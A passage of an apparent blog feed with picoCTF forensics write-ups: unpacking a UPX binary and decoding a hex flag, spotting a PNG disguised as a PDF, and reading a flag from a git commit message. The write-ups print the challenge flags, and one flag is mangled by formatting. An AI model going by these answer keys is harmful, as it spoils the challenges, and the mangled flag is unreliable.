</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>$ file out
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>out: ELF 64-bit LSB executable, x86-64, version <span style="color:#fab387">1</span> <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux<span style="color:#89dceb;font-weight:bold">)</span>, statically linked, no section header</span></span></code></pre></div>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p>I used the <code>strings</code> command to extract and print only the readable strings from the binary file and found these words that might be useful.</p>
<p><img src="image-1.png#center" alt="alt text"></p>
<p>It clearly mentions that the file is packed with the UPX executable. On the internet, I found the command to decompress the executable.</p>
<p><code>upx -d {your executable}</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ upx -d out -o original
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>                       Ultimate Packer <span style="color:#cba6f7">for</span> eXecutables
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>                          Copyright <span style="color:#89dceb;font-weight:bold">(</span>C<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">1996</span> - <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>UPX 4.2.2       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    Jan 3rd <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>        File size         Ratio      Format      Name
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>   --------------------   ------   -----------   -----------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> bad b_info at 0x4b710
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> ... recovery at 0x4b70c
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>    <span style="color:#fab387">877724</span> &lt;-    <span style="color:#fab387">336512</span>   38.34%   linux/amd64   original
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Unpacked <span style="color:#fab387">1</span> file.</span></span></code></pre></div>
<p>the <code>-o</code> option followed by <code>original</code> specifies that the unpacked file should be saved as <code>original</code>.</p>
<br>
<p>Now if you run the <code>strings original</code> command, the content is much more clear like the following:</p>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<p>However, the content is too large. I can&rsquo;t read everything line by line. Let&rsquo;s try if the content includes any flag by running the <strong>grep</strong> command.</p>
<p><code>strings original | grep &quot;flag&quot;</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ strings original | grep <span style="color:#a6e3a1">&#34;flag&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Password correct, please see flag: 7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f36666639363465667d
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">(</span>mode_flags &amp; PRINTF_FORTIFY<span style="color:#89dceb;font-weight:bold">)</span> !<span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>WARNING: Unsupported flag value<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span> of 0x%x in DT_FLAGS_1.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#f5e0dc">version</span> <span style="color:#89dceb;font-weight:bold">==</span> NULL <span style="color:#89dceb;font-weight:bold">||</span> !<span style="color:#89dceb;font-weight:bold">(</span>flags &amp; DL_LOOKUP_RETURN_NEWEST<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>flag.c
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>_dl_x86_hwcap_flags
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span>_dl_stack_flags</span></span></code></pre></div>
<p>Notice that the second line displays some hex dump values. Let&rsquo;s try to convert that hex dump back to its original format.</p>
<p><code>xxd -r -p &lt;&lt;&lt; &quot;7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f36666639363465667d&quot;</code></p>
<p>Let&rsquo;s break down the command:</p>
<ul>
<li><code>xxd</code>: This is a command-line tool that creates a hex dump or converts a hex dump back to its binary form.</li>
<li><code>-r</code>: This option tells <code>xxd</code> to reverse the operation, meaning it will convert a hex dump back into its original binary form.</li>
<li><code>-p</code>: This option tells <code>xxd</code> to use a plain (continuous) hex dump format, without any additional formatting (like line numbers or spaces).</li>
<li><code>&lt;&lt;&lt;</code>: This is known as a <strong>here-string</strong> in bash. When you use the here-string, bash takes the string inside the quotes on the right and provides it as input to the command on its left.</li>
</ul>
<p>output:</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ xxd -r -p <span style="color:#89dceb;font-weight:bold">&lt;&lt;&lt;</span> <span style="color:#a6e3a1">&#34;7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f36666639363465667d&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>U9X_UnP4ck1N6_B1n4Ri3S_6ff964ef<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p><strong><em>flag</em></strong>: <code>picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_6ff964ef}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Secret of the Polyglot</title>
      <link>http://localhost:1313/picoctf-secret-of-the-polyglot/</link>
      <pubDate>Sun, 07 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-secret-of-the-polyglot/</guid>
      <description>Description The Network Operations Center (NOC) of your local institution picked up a suspicious file, they&amp;rsquo;re getting conflicting information on what type of file it is. They&amp;rsquo;ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file? Download the suspicious file.
First, I downloaded the provided file on my Kali Linux VM by the follwing command: wget https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf
The name of the file is flag2of2-final.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<p>The Network Operations Center (NOC) of your local institution picked up a suspicious file, they&rsquo;re getting conflicting information on what type of file it is. They&rsquo;ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file?
Download the suspicious file.</p>
<hr>
<p>First, I downloaded the provided file on my Kali Linux VM by the follwing command:
<code>wget https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf</code></p>
<p>The name of the file is <code>flag2of2-final.pdf</code></p>
<p>I opened the file and it didn&rsquo;t have much information except some random strings, <code>1n_pn9_&amp;_pdf_7f9bccd1}</code></p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p>I tried opening the file using the <code>nano</code> command in the terminal, hoping to see more information. When opened with nano, the top of the file stated <code>PNG</code> and included some non-human readable text. This made me suspect that the file is not a <code>PDF</code> but a <code>PNG</code> file.</p>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<p>The suspicion turned out to be true. The <code>file</code> command is used to determine the type of a file and the file was indeed a .png file.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ file flag2of2-final.pdf
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>flag2of2-final.pdf: PNG image data, <span style="color:#fab387">50</span> x 50, 8-bit/color RGBA, non-interlaced</span></span></code></pre></div>
<br>
<p>So I created a new file by running the following command:
<code>cp flag2of2-final.pdf flag2.png</code></p>
<p>And check out the newly created file! We&rsquo;re really close to the capturing the flag.
<img src="image-2.png#center" alt="alt text"></p>
<p>We&rsquo;re missing the rest of the file but notice the name of the original file, <code>flag2of2-final.pdf</code>. The name implies that it is the second part of the flag.</p>
<p><strong><em>flag</em></strong>: <code>picoCTF{f1u3n7*1n_pn9*&amp;\_pdf_7f9bccd1}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Time Machine</title>
      <link>http://localhost:1313/picoctf-time-machine/</link>
      <pubDate>Sun, 07 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-time-machine/</guid>
      <description>Description What was I last working on? I remember writing a note to help me remember&amp;hellip; You can download the challenge files here: challenge.zip
First, let&amp;rsquo;s download the provided .zip file on our terminal by running the following command:
wget https://artifacts.picoctf.net/c_titan/160/challenge.zip
1leewookb-picoctf@webshell:~$ ls 2README.txt challenge.zip Let&amp;rsquo;s unzip the downloaded file by running the following command:
unzip challenge.zip
1eewookb-picoctf@webshell:~$ unzip challenge.zip 2Archive: challenge.zip 3 creating: drop-in/ 4 inflating: drop-in/message.txt 5 creating: drop-in/.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<p>What was I last working on? I remember writing a note to help me remember&hellip;
You can download the challenge files here:
challenge.zip</p>
<hr>
<p>First, let&rsquo;s download the provided .zip file on our terminal by running the following command:</p>
<p><code>wget https://artifacts.picoctf.net/c_titan/160/challenge.zip</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>leewookb-picoctf@webshell:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>README.txt  challenge.zip</span></span></code></pre></div>
<p>Let&rsquo;s unzip the downloaded file by running the following command:</p>
<p><code>unzip challenge.zip</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>eewookb-picoctf@webshell:~$ unzip challenge.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Archive:  challenge.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>   creating: drop-in/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>  inflating: drop-in/message.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>   creating: drop-in/.git/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>   creating: drop-in/.git/branches/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  inflating: drop-in/.git/description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>   creating: drop-in/.git/hooks/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>  inflating: drop-in/.git/hooks/applypatch-msg.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>  inflating: drop-in/.git/hooks/commit-msg.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>  inflating: drop-in/.git/hooks/fsmonitor-watchman.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>  inflating: drop-in/.git/hooks/post-update.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>  inflating: drop-in/.git/hooks/pre-applypatch.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>  inflating: drop-in/.git/hooks/pre-commit.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>  inflating: drop-in/.git/hooks/pre-merge-commit.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>  inflating: drop-in/.git/hooks/pre-push.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>  inflating: drop-in/.git/hooks/pre-rebase.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>  inflating: drop-in/.git/hooks/pre-receive.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>  inflating: drop-in/.git/hooks/prepare-commit-msg.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>  inflating: drop-in/.git/hooks/update.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>   creating: drop-in/.git/info/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>  inflating: drop-in/.git/info/exclude
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>   creating: drop-in/.git/refs/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>   creating: drop-in/.git/refs/heads/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span> extracting: drop-in/.git/refs/heads/master
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>   creating: drop-in/.git/refs/tags/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span> extracting: drop-in/.git/HEAD
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>  inflating: drop-in/.git/config
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>   creating: drop-in/.git/objects/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>   creating: drop-in/.git/objects/pack/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>   creating: drop-in/.git/objects/info/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>   creating: drop-in/.git/objects/43/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span> extracting: drop-in/.git/objects/43/246218ab4fc7b30e9a9dff073e012316851469
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>   creating: drop-in/.git/objects/25/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span> extracting: drop-in/.git/objects/25/16effb8d70e33bdd0023629b164a77225e1ec2
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>   creating: drop-in/.git/objects/89/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span> extracting: drop-in/.git/objects/89/d296ef533525a1378529be66b22d6a2c01e530
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>  inflating: drop-in/.git/index
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span> extracting: drop-in/.git/COMMIT_EDITMSG
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>   creating: drop-in/.git/logs/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>  inflating: drop-in/.git/logs/HEAD
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>   creating: drop-in/.git/logs/refs/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>   creating: drop-in/.git/logs/refs/heads/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>  inflating: drop-in/.git/logs/refs/heads/master
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">45</span><span>leewookb-picoctf@webshell:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">46</span><span>README.txt  challenge.zip  drop-in</span></span></code></pre></div>
<br>
<p>Inside the drop-in folder, we have one file, <code>message.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>leewookb-picoctf@webshell:~$ <span style="color:#89dceb">cd</span> drop-in
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>leewookb-picoctf@webshell:~/drop-in$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>message.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>leewookb-picoctf@webshell:~/drop-in$ cat message.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>This is what I was working on, but I<span style="color:#f38ba8">&#39;</span>d need to look at my commit <span style="color:#89dceb">history</span> to know why...</span></span></code></pre></div>
<br>
<p>The file didn&rsquo;t include the flag, we were looking for.
Let&rsquo;s run <code>ls -la</code> command to reveal all the hidden files.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>leewookb-picoctf@webshell:~/drop-in$ ls -la
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>total <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>drwxr-xr-x <span style="color:#fab387">3</span> leewookb-picoctf leewookb-picoctf  <span style="color:#fab387">37</span> Mar <span style="color:#fab387">12</span> 00:07 .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>drwxr-xr-x <span style="color:#fab387">4</span> leewookb-picoctf leewookb-picoctf <span style="color:#fab387">185</span> Jul  <span style="color:#fab387">7</span> 05:04 ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>drwxr-xr-x <span style="color:#fab387">8</span> leewookb-picoctf leewookb-picoctf <span style="color:#fab387">166</span> Mar <span style="color:#fab387">12</span> 00:07 .git
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>-rw-r--r-- <span style="color:#fab387">1</span> leewookb-picoctf leewookb-picoctf  <span style="color:#fab387">87</span> Mar <span style="color:#fab387">12</span> 00:07 message.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>leewookb-picoctf@webshell:~/drop-in$ <span style="color:#89dceb">cd</span> .git
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>leewookb-picoctf@webshell:~/drop-in/.git$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>COMMIT_EDITMSG  HEAD  branches  config  description  hooks  index  info  logs  objects  refs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>leewookb-picoctf@webshell:~/drop-in/.git$ cat COMMIT_EDITMSG
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>t1m3m@ch1n3_186cd7d7<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
